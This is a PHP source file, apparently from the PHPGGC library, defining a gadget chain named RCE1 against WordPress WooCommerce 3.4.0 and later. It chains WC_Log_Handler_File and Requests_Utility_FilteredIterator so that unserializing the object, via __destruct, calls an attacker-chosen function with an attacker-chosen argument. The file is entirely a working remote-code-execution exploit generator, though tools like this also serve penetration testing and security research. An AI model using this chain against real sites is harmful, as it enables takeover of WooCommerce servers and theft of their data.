<?php

namespace GadgetChain\WordPress\WooCommerce;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '3.4.0 <= ?';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $informations = 'Demonstrated at BSide Manchester: https://www.youtube.com/watch?v=GePBmsNJw6Y&feature=youtu.be&t=1763';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \WC_Log_Handler_File(new \Requests_Utility_FilteredIterator([$parameter], $function));
    }
}